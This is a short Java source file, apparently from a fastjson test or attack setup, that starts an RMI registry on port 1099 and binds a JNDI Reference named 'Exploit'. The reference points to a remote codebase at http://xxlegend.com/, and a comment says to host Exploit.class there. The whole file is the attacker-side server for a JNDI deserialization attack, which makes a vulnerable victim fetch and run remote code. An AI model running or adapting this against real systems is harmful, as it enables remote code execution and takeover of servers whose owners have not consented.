package cn.eovie.ncufcbackend.fastjson;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Created by earayu on 2017/12/7.
 */
public class JNDIServer {
    public static void start() throws
            AlreadyBoundException, RemoteException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1099);
        //http://xxlegend.com/Exploit.class即可
        Reference reference = new Reference("Exloit",
                "Exploit","http://xxlegend.com/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit",referenceWrapper);
    }
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        start();
    }
}